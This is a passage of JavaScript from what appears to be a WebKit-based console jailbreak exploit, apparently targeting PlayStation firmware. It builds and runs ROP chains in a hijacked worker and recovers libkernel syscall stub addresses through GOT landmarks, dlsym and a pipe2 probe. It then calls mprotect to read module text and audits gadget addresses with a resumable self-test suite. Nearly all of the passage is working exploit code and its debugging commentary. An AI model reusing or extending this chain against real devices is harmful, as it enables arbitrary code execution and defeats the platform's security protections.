                + " -- 10s, no answer and no crash");
            /* Lead with the measurements. jbmarks are filtered by a list
               that lives in index.html, which is itself cached and therefore
               does not know about CHAIN-HUNG -- so the mark exists and never
               reaches the screen. The thrown message does reach it, but the
               screen truncates at ~110 characters, and the previous wording
               spent all of them on prose. Numbers first, explanation after. */
            throw new Error("ran away " + tag + " ret=" + rv + " name="
                + (chain.jbName || "?")
                + " -- worker neither answered nor crashed in 10s;"
                + " ret still poisoned means it never got past the pivot,"
                + " a written ret means the body ran and something blocked.");
        }
    }

    let p2 = {
        write8: p.write8,
        write4: p.write4,
        write2: p.write2,
        write1: p.write1,
        read8: p.read8,
        read4: p.read4,
        read2: p.read2,
        read1: p.read1,
        leakval: p.leakval,
        pre_chain: pre_chain,
        launch_chain: launch_chain,
        malloc_dump: malloc_dump,
        malloc: malloc,
        stringify: stringify,
        array_from_address: array_from_address,
        readstr: readstr,
        writestr: writestr,
        libSceNKWebKitBase: libSceNKWebKitBase,
        libSceLibcInternalBase: libSceLibcInternalBase,
        libKernelBase: libKernelBase,
        nogc: nogc,
        syscalls: syscalls,
        gadgets: gadgets
    };

    p2.LC_SOURCED = LC_SOURCED;
    /* One correct stub is enough. See rop.js fsyscall: stub+7 is
       `mov r10,rcx ; syscall ; jb err ; ret`, the same in all 328, so with
       rax loaded by `pop rax` every syscall number is reachable through it.
       getpid's stub is the one to build on -- read from the import GOT, not
       interpolated -- which retires the 272 addresses that were only as good
       as the step they were guessed in, and the 35 that had to be dropped.
       Verified below before anything is allowed to depend on it. */
    if (SHIFT.exact && SHIFT.exact[0x14] && (0x14 in syscall_map))
        p2.syscall_insn = libKernelBase.add32(syscall_map[0x14] + 7);
    /* A dropped stub is an unknown ADDRESS, not a missing syscall: 7_00_00_44
       has all 328 and .70 only added to them. Once fsyscall can invoke by
       number that distinction matters, because poops' needStub() asks "is
       there an entry" and would refuse a syscall that is now callable.
       So give the dropped ones an entry pointing at the syscall instruction
       itself and record that they are by-number-only. That address is right
       for fsyscall (which loads rax) and wrong for anything that pushes it
       raw -- so rop.js refuses those instead of running whatever rax held.
       Without the flag this would be the same silent-wrong-stub bug that made
       getpid return -1, moved somewhere harder to see. */
    p2.byNumberOnly = {};
    if (p2.syscall_insn && SHIFT.goneList) {
        for (const nr of SHIFT.goneList) {
            syscalls[nr] = p2.syscall_insn;
            p2.byNumberOnly[nr] = 1;
        }
        jbmark("SYSCALL-BYNUMBER", SHIFT.goneList.length + " stub(s) with an"
            + " unknown address are callable by number | 0x17="
            + (p2.byNumberOnly[0x17] ? "by number" : "had an address"));
    }
    /* Every OFFSET_lk_* TEXT constant is still a 7_00_00_44 address. The
       syscall stubs were corrected because syscall_map is a mutable object;
       these are `const`, so nothing could rewrite them, and SHIFT-TODO has
       been reporting that for several runs without anything acting on it.
       rop.js calls pthread_exit and pthread_create_name_np, and poops.js
       builds its whole LK_* table out of them, so stage 5 would jump into the
       middle of whatever .70 put at the .44 address.

       Expose the same bracket rule the stubs use instead: shifted where the
       landmarks either side agree, and left alone -- loudly -- where they do
       not, because a wrong function pointer is worse than a missing one. */
    p2.lkfix = (rva) => rva + (typeof SHIFT.at === "function"
        ? (SHIFT.at(rva) || 0) : 0);
    /* poops.js is a module and cannot see p2, so publish the same correction
       globally. It reads every libkernel function address through LKFIX(). */
    try { window.__lkfix = p2.lkfix; } catch (e) {  }
    if (typeof SHIFT.at === "function") {
        const names = {
            pthread_exit: typeof OFFSET_lk_pthread_exit === "number"
                ? OFFSET_lk_pthread_exit : null,
            pthread_create_name_np:
                typeof OFFSET_lk_pthread_create_name_np === "number"
                    ? OFFSET_lk_pthread_create_name_np : null,
            scePthreadCreate: typeof OFFSET_lk_scePthreadCreate === "number"
                ? OFFSET_lk_scePthreadCreate : null,
            sysctlbyname: typeof OFFSET_lk_sysctlbyname === "number"
                ? OFFSET_lk_sysctlbyname : null,
        };
        const unresolved = [];
        let moved = 0;
        for (const k in names) {
            if (names[k] === null) continue;
            const d = SHIFT.at(names[k]);
            if (d === null) unresolved.push(k); else if (d) moved++;
        }
        jbmark("SHIFT-LKFUNC", moved + " of " + Object.keys(names).length
            + " libkernel functions shift"
            + (unresolved.length ? " | UNRESOLVED: " + unresolved.join(",")
                + " -- stage 5 must not call these" : " | all resolved"));
    }

    let chain = new worker_rop(p2);

    const JB_POISON = new int64(0xDEADBEEF, 0x00C0FFEE);
    p.write8(chain.return_value, JB_POISON);
    jbmark("PREP-GETPID-PRE", "retval=0x" + chain.return_value.toString()
        + "-poisoned-next=chain.syscall(SYS_GETPID)");

    /* Empty chain first: a fresh worker_rop already carries pre_chain (setjmp),
       and run() appends launch_chain's three restore-writes plus longjmp. So
       this exercises the pivot, setjmp, `pop rdi`, `pop rsi`, `mov [rdi],rsi`
       and longjmp -- everything the getpid chain uses EXCEPT the syscall stub.
       Survive this and the fault is the stub; die here and it is the pivot or
       the setjmp/longjmp round trip. Costs one extra round trip. */
    crumb("nc");
    await chain.run();
    crumb("nc-ok");
    jbmark("PREP-NULLCHAIN-OK", "pivot+setjmp+longjmp round trip survived");

    crumb("gp-call");
    let pid = await chain.syscall(SYS_GETPID);
    crumb("gp-ret");

    jbmark("PREP-GETPID-POST", "raw=0x" + pid.toString());
    if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
        jbmark("PREP-CHAIN-DIDNT-RUN", "return-slot-still-poisoned");
        throw new Error("The ROP chain never executed: the return slot still "
            + "holds the poison. The hijacked thread is not the one postMessage "
            + "wakes (main.js:69's worker vs this one), or the stack write did "
            + "not land.");
    }

    if (pid.low == 0) {
        throw new Error("Webkit exploit failed.");
    }
    /* getpid() cannot fail and a pid is a small positive integer, so -1 (or
       anything with high bits set) means the chain ran but did NOT return what
       the syscall returned -- a wrong stub, or rax clobbered before
       write_result. The old guard only rejected 0, so 0xFFFFFFFF sailed
       through and every syscall return value downstream was suspect. */
    const pidOK = pid.hi === 0 && pid.low > 0 && pid.low < 0x100000;
    /* Prove the universal path against the one it was derived from: the same
       getpid, invoked by number through stub+7 instead of by address. Equal
       answers mean rax reaches the kernel and the tail behaves; anything else
       and it is switched off rather than trusted quietly. */
    if (p2.syscall_insn) {
        const viaInsn = await chain.syscall(0x14);
        const same = viaInsn.low === pid.low && viaInsn.hi === pid.hi;
        if (!same) p2.syscall_insn = null;
        jbmark("SYSCALL-INSN", same
            ? "stub+7 with pop rax returns the same pid -- every syscall number"
            + " is now reachable without a stub address"
            : "DISABLED: by-number getpid gave 0x" + viaInsn.toString()
            + " but by-address gave " + pid.low);
    }

    jbmark("PREP-GETPID-OK", "pid=" + pid.low + (pidOK ? ""
        : " *** IMPLAUSIBLE (0x" + pid.toString() + ") -- getpid cannot fail,"
        + " so the syscall return path is wrong ***"));
    crumb("OK");

    /* Ask the loader, instead of measuring.
       -----------------------------------------------------------------------
       mprotect came back -1, so text stays unreadable and the displacement
       measurement is all there is -- and it has one hole left. Between 0x36100
       (+0x540) and 0x36420 (+0x560) exactly one stub was inserted, and no
       import landmark falls inside, so all 25 stubs in that window were
       dropped. Two of them are the ones poops needs: 0x2AF at 0x363a0 and
       0x1AF at 0x363e0. Checking all 230 modules in the PUP found exactly one
       importer of the bracketing NIDs, libScePsm, which is not loaded here.
       So there are no more landmarks to find.

       But 264 of the stubs are EXPORTED BY NAME, and this is a devkit, where
       sys_dynlib_dlsym is normally available. The loader already knows every
       address we have been triangulating. Ask it: one resolved export inside
       the window pins the insertion point, and 0x363c0 (KIbJFQ0I1Cg) sits
       between the two stubs that matter, so it settles both at once.

       Cheap and safe: a wrong handle or a missing syscall returns -1. */
    if (typeof OFFSET_lk_stub_nids !== "undefined" && (0x24f in syscall_map)) {
        try {
            const outp = malloc(0x40);
            const dlsym = async (h, nid) => {
                p.write8(outp, new int64(0, 0));
                const r = await chain.syscall(0x24f, h, stringify(nid), outp);
                if (r.low !== 0 || r.hi !== 0) return null;
                const v = p.read8(outp);
                if (v.low === 0 && v.hi === 0) return null;
                return (v.hi >>> 0) * 4294967296 + (v.low >>> 0);
            };
            /* Enumerate the handles instead of guessing them. The first
               attempt swept 0..24 on the assumption that module handles are
               small sequential integers; they are not necessarily, and a
               sweep that misses proves nothing -- it cannot tell "dlsym is
               restricted" apart from "wrong handle". sys_dynlib_get_list
               (0x24C) resolved as part of the +0x540 step, so ask it. */
            const lkNum = (libKernelBase.hi >>> 0) * 4294967296
                + (libKernelBase.low >>> 0);
            const getpidAbs = lkNum + syscall_map[0x14];
            const hbuf = malloc(0x200), hcnt = malloc(0x40);
            let handles = [];
            if (0x24c in syscall_map) {
                p.write8(hcnt, new int64(0, 0));
                const r = await chain.syscall(0x24c, hbuf, 0x40, hcnt);
                const n = p.read4(hcnt);
                if (r.low === 0 && r.hi === 0 && n > 0 && n <= 0x40) {
                    const a = array_from_address(hbuf, n * 4);
                    for (let i = 0; i < n; i++)
                        handles.push(a[i * 4] | (a[i * 4 + 1] << 8)
                            | (a[i * 4 + 2] << 16) | (a[i * 4 + 3] << 24));
                }
                jbmark("DLSYM-LIST", handles.length
                    ? handles.length + " modules: "
                    + handles.slice(0, 12).join(",")
                    : "get_list returned " + r.low + " -- falling back to a sweep");
            }
            /* poops.js has carried LIBKERNEL_HANDLE 0x2001 and LIBC_HANDLE
               0x2 since long before this port -- SCE module handles are not
               small sequential integers, which is why sweeping 0..24 found
               nothing and why that sweep proved nothing either. Try the known
               ones first, then whatever get_list returned, then a sweep. */
            handles = [0x2001, 0x2, 0x2000, 0x1].concat(handles);
            for (let h = 0; h <= 64; h++) handles.push(h);
            /* Validate before believing: the right module is the one whose
               dlsym answer for getpid matches the address already read out of
               the GOT. Two name forms, because the loader may want the bare
               NID or the encoded name as it appears in the string table. */
            let handle = -1, form = "";
            for (const h of handles) {
                for (const nm of ["HoLVWNanBBc", "HoLVWNanBBc#H#A"]) {
                    if (await dlsym(h, nm) === getpidAbs) {
                        handle = h; form = nm; break;
                    }
                }
                if (handle >= 0) break;
            }
            const SUF = form.indexOf("#") >= 0 ? "#H#A" : "";
            jbmark("DLSYM", handle < 0
                ? "tried " + handles.length + " handle(s), none resolved getpid"
                + " to its known address -- dlsym is restricted here"
                : "handle " + handle + " agrees with the GOT on getpid"
                + (SUF ? " (encoded names)" : " (bare NIDs)"));
            if (handle >= 0) {
                let fixed = 0, added = 0, conflict = 0;
                /* Window first. Each dlsym is a worker round trip, and the
                   16 exports inside 0x36100..0x36420 are the only ones that
                   change what is already known -- everything else merely
                   confirms a landmark. If a later call kills the run, the
                   answer that mattered is already in. */
                const order = OFFSET_lk_stub_nids.slice().sort((a, b) =>
                    ((a[0] >= 0x36100 && a[0] <= 0x36420) ? 0 : 1)
                    - ((b[0] >= 0x36100 && b[0] <= 0x36420) ? 0 : 1));
                for (const e of order) {
                    const nr = e[1];
                    const a = await dlsym(handle, e[2] + SUF);
                    if (a === null) continue;
                    const rva = a - lkNum;
                    if (rva <= 0x1000 || rva >= 0x60000) continue;
                    if (nr in syscall_map) {
                        if (syscall_map[nr] !== rva) conflict++;
                        else { fixed++; continue; }
                    } else added++;
                    syscall_map[nr] = rva;
                    syscalls[nr] = libKernelBase.add32(rva);
                }
                jbmark("DLSYM-STUBS", added + " recovered, " + fixed
                    + " confirmed, " + conflict + " corrected"
                    + " | 0x1AF=" + (syscall_map[0x1af]
                        ? "0x" + syscall_map[0x1af].toString(16) : "still gone")
                    + " 0x2AF=" + (syscall_map[0x2af]
                        ? "0x" + syscall_map[0x2af].toString(16) : "still gone"));
                /* 0x1AF and 0x2AF are NOT exported, so dlsym cannot name them.
                   Their exported neighbours can though: 0x363c0 sits between
                   them and 0x36380 / 0x36420 close the bracket. Once those are
                   known, a stub between two neighbours that agree takes their
                   shift -- the same rule as everywhere else, now with the
                   landmarks dense enough to apply it. */
                const known = OFFSET_lk_stub_nids
                    .filter(e => e[1] in syscall_map)
                    .map(e => [e[0], syscall_map[e[1]] - e[0]])
                    .sort((a, b) => a[0] - b[0]);
                const between = (rva) => {
                    let lo = null, hi = null;
                    for (const r of known) {
                        if (r[0] <= rva) lo = r;
                        if (r[0] >= rva) { hi = r; break; }
                    }
                    return (lo && hi && lo[1] === hi[1]) ? lo[1] : null;
                };
                const rescued = [];
                for (const [nr, rva] of [[0x1af, 0x363e0], [0x2af, 0x363a0],
                                         [0x1b1, 0x36400]]) {
                    if (nr in syscall_map) continue;
                    const d = between(rva);
                    if (d === null) continue;
                    syscall_map[nr] = rva + d;
                    syscalls[nr] = libKernelBase.add32(rva + d);
                    rescued.push("0x" + nr.toString(16) + "=+0x"
                        + d.toString(16));
                }
                jbmark("DLSYM-BRACKET", rescued.length
                    ? rescued.join(" ") + " -- unexported stubs recovered from"
                    + " neighbours that agree"
                    : "the unexported stubs are still bracketed by neighbours"
                    + " that disagree");
            }
        } catch (e) {
            jbmark("DLSYM-FAILED", String((e && e.message) || e));
        }
    }

    /* Resolve the last window by PROVING a syscall, not by guessing it.
       -----------------------------------------------------------------------
       mprotect is refused and dlsym is restricted (69 handles tried, including
       poops' own LIBKERNEL_HANDLE 0x2001, none agreed with the GOT on getpid),
       so neither reading the stubs nor asking the loader is available. What is
       left is the window 0x36100 (+0x540) .. 0x36420 (+0x560), where one stub
       was inserted and no landmark falls inside.

       The two stubs poops needs are in it, and one of them is a gift: 0x2AF is
       pipe2. A pipe can be PROVED -- create it, write a byte, read the byte
       back, and only the real pipe2 can produce that result. So instead of
       reasoning about which side of the insertion it falls on, call both
       candidates and keep whichever actually makes a working pipe.

       The shift is monotonic, so a positive answer settles more than itself:
       0x2AF sits at 0x363a0 and 0x1AF (thr_exit) at 0x363e0, so if pipe2 turns
       out to be +0x560 then thr_exit -- being higher -- must be +0x560 too.
       Only if pipe2 is +0x540 does thr_exit stay ambiguous, and thr_exit is
       exactly the syscall not to guess at.

       Order matters: try +0x560 first. If it is right the pipe works and the
       lower candidate is never called at all. */
    if (!(0x2af in syscall_map) && typeof SHIFT.at === "function"
        && (0x6 in syscall_map)) {
        try {
            const fdbuf = malloc(0x40);
            const iobuf = malloc(0x40);
            const provePipe = async (rva) => {
                p.write8(fdbuf, new int64(0xFFFFFFFF, 0xFFFFFFFF));
                const addr = libKernelBase.add32(rva);
                const r = await chain.call(addr, fdbuf, 0);
                if (r.low !== 0 || r.hi !== 0) return null;
                const rd = p.read4(fdbuf), wr = p.read4(fdbuf.add32(4));
                if (!(rd > 2 && rd < 0x1000 && wr > 2 && wr < 0x1000
                    && rd !== wr)) return null;
                /* Two plausible fds is suggestive; a byte making the round trip
                   is proof. Nothing but a real pipe does that. */
                let ok = false;
                if ((0x4 in syscall_map) && (0x3 in syscall_map)) {
                    p.write8(iobuf, new int64(0x5A5A5A5A, 0));
                    const w = await chain.syscall(0x4, wr, iobuf, 1);
                    if (w.low === 1) {
                        p.write8(iobuf, new int64(0, 0));
                        const q = await chain.syscall(0x3, rd, iobuf, 1);
                        ok = q.low === 1 && (p.read4(iobuf) & 0xff) === 0x5a;
                    }
                }
                await chain.syscall(0x6, rd);
                await chain.syscall(0x6, wr);
                return ok ? { rd, wr } : null;
            };
            let picked = null;
            for (const d of [0x560, 0x540]) {
                if (await provePipe(0x363a0 + d)) { picked = d; break; }
            }
            if (picked === null) {
                jbmark("PIPE2-PROBE", "neither 0x363a0+0x540 nor +0x560 made a"
                    + " working pipe -- the window model is wrong, not just"
                    + " unresolved");
            } else {
                syscall_map[0x2af] = 0x363a0 + picked;
                syscalls[0x2af] = libKernelBase.add32(0x363a0 + picked);
                let tail = "";
                if (picked === 0x560) {
                    /* Monotonic: 0x363e0 > 0x363a0, so it cannot shift less. */
                    syscall_map[0x1af] = 0x363e0 + 0x560;
                    syscalls[0x1af] = libKernelBase.add32(0x363e0 + 0x560);
                    tail = " | 0x1AF=0x" + (0x363e0 + 0x560).toString(16)
                        + " follows by monotonicity";
                } else {
                    tail = " | 0x1AF still ambiguous (+0x540 or +0x560) and"
                        + " thr_exit is not worth guessing";
                }
                jbmark("PIPE2-PROBE", "0x2AF=0x"
                    + (0x363a0 + picked).toString(16) + " PROVEN by a byte"
                    + " round trip (+0x" + picked.toString(16) + ")" + tail);
            }
        } catch (e) {
            jbmark("PIPE2-PROBE-FAILED", String((e && e.message) || e));
        }
    }

    /* Stop inferring: make text readable and LOOK.
       -----------------------------------------------------------------------
       Everything up to here has been triangulation, because libSceNKWebKit and
       libkernel_web both map their text PF_X only -- a read faults and kills
       the WebProcess, so a gadget could only ever be judged by whether running
       it survived. That cost eight runs to find one bad store and still left
       pop rdx unexplained.

       But mprotect's stub resolved (its address is bracketed by landmarks that
       agree), and a working chain can call it. If the kernel lets us add
       PROT_READ to a module's text then every remaining question -- which
       gadget is where, which stub is which syscall -- stops being an inference
       and becomes a read. If it refuses, it returns -1 and nothing is harmed.

       libkernel_web goes first: it is 275KB against 54MB, and scanning it for
       `48 c7 c0 <nr> 49 89 ca 0f 05` rebuilds the ENTIRE syscall table exactly,
       including the 35 stubs that had to be dropped as unresolvable and the
       272 that are only as good as the step they were interpolated in. */
    if (typeof OFFSET_wk_text_audit !== "undefined" && OFFSET_wk_text_audit
        && (0x4a in syscall_map)) {
        const PROT_RX = 5;                       // PROT_READ | PROT_EXEC
        const mprot = async (base, off, len) => {
            const r = await chain.syscall(0x4a, base.add32(off & ~0x3fff),
                (len + (off & 0x3fff) + 0x3fff) & ~0x3fff, PROT_RX);
            return r.low === 0 && r.hi === 0;
        };
        const hex = (u8, n) => {
            let o = "";
            for (let i = 0; i < n; i++)
                o += (u8[i] < 16 ? "0" : "") + u8[i].toString(16);
            return o;
        };
        /* Resumable, for the same reason the gadget suite is: a read of a
           page mprotect claims is readable but is not kills the WebProcess
           synchronously, and without a persisted marker the next run faults at
           exactly the same place forever. Commit "doing" BEFORE each read; a
           run that finds one still set knows that step killed the last run and
           skips it. */
        ps.au = ps.au || {};
        /* A FAULT verdict is only valid for the chain that produced it. v=49
           died at mp-lk because `pop rdx` was broken, which marked the
           libkernel read as FAULT -- and that verdict then survived the fix
           and skipped the read forever, which is why 0x1AF and 0x2AF were
           still missing after pop rdx started working. So stamp the audit
           state with the gadget map and discard it whenever that changes:
           what crashed a chain says nothing about a different chain. */
        const auSig = (function () {
            let src = Object.keys(wk_gadgetmap).sort()
                .map(k => k + ":" + wk_gadgetmap[k]).join(",");
            if (typeof lc_gadgetmap !== "undefined")
                src += "|" + Object.keys(lc_gadgetmap).sort()
                    .map(k => k + ":" + lc_gadgetmap[k]).join(",");
            /* The DISPATCH mechanism belongs in this signature too, not just
               the gadgets. "mprotect refused" was recorded while syscalls went
               by stub address, and mprotect's was one of the 272 interpolated
               ones -- on a 0x20 grid a miss runs a different syscall, so that
               -1 may never have come from mprotect at all. fsyscall now calls
               by number through a verified instruction, which is a different
               question with a different answer, and the old verdict was
               outliving the thing it was a verdict about. Same mistake as the
               FAULT that survived the pop rdx fix. */
            src += "|dispatch:" + (p2 && p2.syscall_insn ? "bynumber" : "byaddr");
            let h = 0;
            for (let z = 0; z < src.length; z++)
                h = ((h * 31 + src.charCodeAt(z)) & 0x7fffffff);
            return h;
        })();
        if (ps.auSig !== auSig) {
            const n = Object.keys(ps.au).length;
            ps.au = {}; ps.auSig = auSig;
            if (n) jbmark("AUDIT-RESET", "the gadget map changed -- discarded "
                + n + " verdict(s), including any FAULT the old chain caused");
        }
        for (const k in ps.au) if (ps.au[k] === "doing") ps.au[k] = "FAULT";
        psSave();
        const auStep = (k) => {
            if (ps.au[k]) return false;
            ps.au[k] = "doing"; psSave(); return true;
        };
        const auDone = (k, v) => { ps.au[k] = v || "ok"; psSave(); };
        const faulted = Object.keys(ps.au).filter(k => ps.au[k] === "FAULT");
        if (faulted.length)
            jbmark("AUDIT-FAULTED", faulted.slice(0, 6).join(",")
                + " killed an earlier run and will not be retried");
        try {
            crumb("mp-lk");
            /* libkernel_web text is 0x426e2 in our file and the console's is
               0x580 longer at the top step, so ask for a little extra. */
            const lkPrev = ps.au["lk"];
            const lkSkip = lkPrev === "FAULT" || lkPrev === "refused";
            let lkOk = false;
            if (!lkSkip) {
                ps.au["lk"] = "doing"; psSave();
                lkOk = await mprot(libKernelBase, 0, 0x48000);
                if (!lkOk) { ps.au["lk"] = "refused"; psSave(); }
            }
            jbmark("MPROTECT-LK", lkSkip
                ? "skipped: " + lkPrev + " on an earlier run"
                : lkOk ? "text is readable" : "refused (-1)");
            if (lkOk) {
                crumb("scan-lk");
                const u8 = array_from_address(libKernelBase, 0x48000);
                const rebuilt = {};
                let n = 0;
                for (let a = 0; a < 0x48000 - 12; a++) {
                    if (u8[a] !== 0x48 || u8[a + 1] !== 0xc7 || u8[a + 2] !== 0xc0)
                        continue;
                    if (u8[a + 7] !== 0x49 || u8[a + 8] !== 0x89
                        || u8[a + 9] !== 0xca || u8[a + 10] !== 0x0f
                        || u8[a + 11] !== 0x05) continue;
                    const nr = u8[a + 3] | (u8[a + 4] << 8) | (u8[a + 5] << 16)
                        | (u8[a + 6] << 24);
                    /* Two stubs for one number happens; 9.00's profile always
                       took the lower address, so match that. */
                    if (!(nr in rebuilt)) { rebuilt[nr] = a; n++; }
                }
                /* Cross-check against the 21 that were read from the GOT before
                   trusting a scan of bytes we have never seen. */
                let agree = 0, disagree = 0;
                for (const e of OFFSET_lk_syscall_landmarks) {
                    if (!(e[0] in rebuilt)) continue;
                    if (rebuilt[e[0]] === syscall_map[e[0]]) agree++;
                    else disagree++;
                }
                auDone("lk");          // survived the read: safe to redo
                jbmark("SYSCALL-SCAN", n + " stubs found | agrees with "
                    + agree + " of the GOT-read ones, differs on " + disagree);
                if (disagree === 0 && agree >= 15 && n > 250) {
                    for (const k in syscall_map) delete syscall_map[k];
                    for (const nr in rebuilt) {
                        syscall_map[nr] = rebuilt[nr];
                        syscalls[nr] = libKernelBase.add32(rebuilt[nr]);
                    }
                    jbmark("SYSCALL-REBUILT", n + " stubs, read not derived"
                        + " | getpid 0x" + rebuilt[0x14].toString(16)
                        + " mmap 0x" + (rebuilt[0x1dd] || 0).toString(16)
                        + " thr_new 0x" + (rebuilt[0x1c7] || 0).toString(16));
                } else {
                    jbmark("SYSCALL-SCAN-REJECTED", "kept the derived table:"
                        + " the scan disagrees with stubs that were read"
                        + " directly, so something about it is wrong");
                }
            }

            /* Now the gadgets. One page each rather than 54MB in one call:
               less to refuse, and a page is all an audit needs. */
            crumb("mp-wk");
            const names = Object.keys(wk_gadgetmap);
            const wrong = [];
            let checked = 0, unreadable = 0;
            for (const nm of names) {
                const want = OFFSET_wk_gadget_bytes[nm];
                if (!want || LC_SOURCED[nm]) continue;
                if (!auStep("g:" + nm)) continue;
                const rva = wk_gadgetmap[nm];
                if (!await mprot(libSceNKWebKitBase, rva, 16)) {
                    auDone("g:" + nm, "refused");
                    unreadable++;
                    /* If the kernel will not add PROT_READ to one page of this
                       module it will not do it for the next 25 either; stop
                       rather than spend a worker round trip per gadget. */
                    if (unreadable >= 2 && checked === 0) break;
                    continue;
                }
                const u8 = array_from_address(libSceNKWebKitBase.add32(rva), 16);
                const got = hex(u8, want.length / 2);
                auDone("g:" + nm, got === want ? "ok" : got);
                checked++;
                if (got !== want) wrong.push(nm);
            }
            /* Verdicts survive a reload, so a run that dies mid-audit still
               contributes -- replay what is already known. */
            for (const nm in wk_gadgetmap) {
                const v = ps.au["g:" + nm];
                if (v && v !== "ok" && v !== "refused" && v !== "FAULT"
                    && wrong.indexOf(nm) === -1) wrong.push(nm);
            }
            for (const nm in wk_gadgetmap) {
                const v = ps.au["s:" + nm];
                if (v && v.indexOf("0x") === 0) {
                    wk_gadgetmap[nm] = parseInt(v, 16);
                    gadgets[nm] = libSceNKWebKitBase.add32(wk_gadgetmap[nm]);
                }
            }
            jbmark("GADGET-AUDIT", checked + " read, " + wrong.length
                + " wrong, " + unreadable + " unreadable");
            for (let i = 0; i < wrong.length && i < 8; i++) {
                const nm = wrong[i], rva = wk_gadgetmap[nm];
                const u8 = array_from_address(libSceNKWebKitBase.add32(rva), 16);
                jbmark("GADGET-BAD-" + (i + 1), nm + " @0x" + rva.toString(16)
                    + " is " + hex(u8, 8) + " want " + OFFSET_wk_gadget_bytes[nm]);
            }
            /* A wrong gadget is only half the answer -- find where it went.
               Search a window around the expected address for the exact bytes
               the name requires; with the shift already measured the real one
               is a few hundred bytes away, not megabytes. */
            for (let i = 0; i < wrong.length && i < 6; i++) {
                const nm = wrong[i], rva = wk_gadgetmap[nm];
                const want = OFFSET_wk_gadget_bytes[nm];
                const L = want.length / 2, W = 0x8000;
                const lo = Math.max(0, rva - W);
                if (!auStep("s:" + nm)) continue;
                if (!await mprot(libSceNKWebKitBase, lo, W * 2)) {
                    auDone("s:" + nm, "refused"); continue;
                }
                const u8 = array_from_address(libSceNKWebKitBase.add32(lo), W * 2);
                let found = -1;
                for (let a = 0; a < W * 2 - L; a++) {
                    let ok = 1;
                    for (let b = 0; b < L; b++)
                        if (u8[a + b] !== parseInt(want.substr(b * 2, 2), 16)) { ok = 0; break; }
                    if (ok && (found < 0
                        || Math.abs(lo + a - rva) < Math.abs(found - rva)))
                        found = lo + a;
                }
                auDone("s:" + nm, found < 0 ? "none" : "0x" + found.toString(16));
                jbmark("GADGET-FIX-" + (i + 1), nm + " 0x" + rva.toString(16)
                    + (found < 0 ? " -> not found within +-0x8000"
                        : " -> 0x" + found.toString(16) + " (delta "
                        + (found - rva) + ")"));
                if (found >= 0) {
                    wk_gadgetmap[nm] = found;
                    gadgets[nm] = libSceNKWebKitBase.add32(found);
                }
            }
        } catch (e) {
            jbmark("AUDIT-FAILED", String((e && e.message) || e));
        }
    }

    /* Gadget conformance suite.
       -----------------------------------------------------------------------
       prepare() now completes, which changes what is possible: a WORKING chain
       can execute a gadget and hand the result back to JS, so gadgets no longer
       have to be inferred from whether the process died. That matters because
       `mov [rdi], rsi` was silently wrong and cost eight runs to find by
       bisection -- and it came from the same generator as everything else here,
       so the rest deserve checking before they are trusted deeper in.

       Each gadget is exercised in its own chain launch, with its own crumb, so
       one that desyncs and crashes names itself in the trail rather than
       leaving another anonymous "died-after=pm". Ones that return are checked
       against the value they should have produced. */
    if (typeof OFFSET_wk_gadget_selftest !== "undefined" && OFFSET_wk_gadget_selftest) {
        const out = malloc(0x40);
        const cell = malloc(0x40);
        const bad = [];
        const eq = (v, lo, hi) => v.low === (lo >>> 0) && v.hi === (hi >>> 0);

        /* Resumable across runs. A gadget that desyncs the chain kills the
           process, so without this the suite dies at the same test every time
           and never reaches the ones after it. Mark each test "pending" and
           commit that BEFORE running it: if the process dies, the next run
           sees the pending mark, records a crash, and skips straight past it.
           A few reloads therefore enumerate every broken gadget instead of
           re-finding the first one forever. */
        ps.gt = ps.gt || {};
        /* A verdict is only about the address it was measured against, so
           fingerprint the whole gadget map and discard every result when any
           address changes. Otherwise editing one entry leaves it marked CRASH
           from the previous address and the suite skips the very test the edit
           was meant to re-run. gtRev covers changes to the TESTS themselves
           (push_write4's check was wrong, not the gadget). */
        const gtSig = (function () {
            const src = Object.keys(wk_gadgetmap).sort()
                .map(k => k + ":" + wk_gadgetmap[k]).join(",")
                + "|lc:" + (typeof lc_gadgetmap !== "undefined"
                    ? Object.keys(lc_gadgetmap).sort()
                        .map(k => k + ":" + lc_gadgetmap[k]).join(",") : "")
                + "|rev5-lc-sourced";
            let h = 0;
            for (let z = 0; z < src.length; z++)
                h = ((h * 31 + src.charCodeAt(z)) & 0x7fffffff);
            return h;
        })();
        if (ps.gtSig !== gtSig) {
            const n = Object.keys(ps.gt).length;
            ps.gt = {};
            ps.gtSig = gtSig;
            psSave();
            if (n) jbmark("GADGET-RESET", "the gadget map changed -- discarded "
                + n + " verdict(s) measured against the old addresses");
        }
        const gtSave = () => psSave();
        for (const k in ps.gt) if (ps.gt[k] === "pending") {
            ps.gt[k] = "CRASH";
            bad.push(k + "=CRASHED-the-chain");
        }
        gtSave();

        const runTest = async (name, build, check, selfWrites) => {
            if (ps.gt[name]) {                      // already decided
                if (ps.gt[name] !== "ok" && bad.indexOf(name) === -1
                    && !bad.some(b => b.indexOf(name + "=") === 0))
                    bad.push(name + "=" + ps.gt[name]);
                return;
            }
            crumb("g:" + name);
            ps.gt[name] = "pending";
            gtSave();
            p.write8(out, new int64(0xDEAD0000, 0xDEAD0000));
            build();
            if (!selfWrites) chain.write_result(out);
            await chain.run();
            const got = p.read8(out);
            const okv = check(got);
            const prior = ps.gt[name];
            ps.gt[name] = okv ? "ok" : ("0x" + got.toString());
            /* syscall:getgid passed in one run and crashed the chain in
               another, so results here are not always reproducible. Keep a
               tally: a verdict backed by one observation is worth less than one
               backed by several, and a flip is worth knowing about. */
            ps.gtHist = ps.gtHist || {};
            const h = ps.gtHist[name] = ps.gtHist[name] || { ok: 0, bad: 0 };
            if (okv) h.ok++; else h.bad++;
            if (prior && prior !== ps.gt[name])
                jbmark("GADGET-FLIP", name + ": was " + prior + ", now "
                    + ps.gt[name] + " (ok=" + h.ok + " bad=" + h.bad + ")");
            gtSave();
            if (!okv) bad.push(name + "=0x" + got.toString());
        };

        try {
            /* Where does executable text actually end?
               -----------------------------------------------------------
               Everything <= 0x12A439 executes, everything >= 0x214613 faults.
               Two very different explanations fit that, and they call for
               opposite fixes:
                 (a) text ends around there and the rest of the image is data,
                     so those "gadgets" are not code at all and no address in
                     that region is usable;
                 (b) it IS code, but the profile's file->rva conversion drifts
                     past some point -- exactly what the import GOT did when it
                     needed +0x4000 -- so the addresses are merely biased.
               Text is execute-only and data is readable, so a single read
               separates them: if the address reads back, it is data and (a) is
               right; if the read faults, it is executable and (b) is.
               Resumable like the gadget tests -- a faulting read kills the
               process, and the pending mark records that as FAULT. */
            if (!ps.gt["exec:pop rdx"] || ps.gt["exec:pop rdx"] === "ok") {
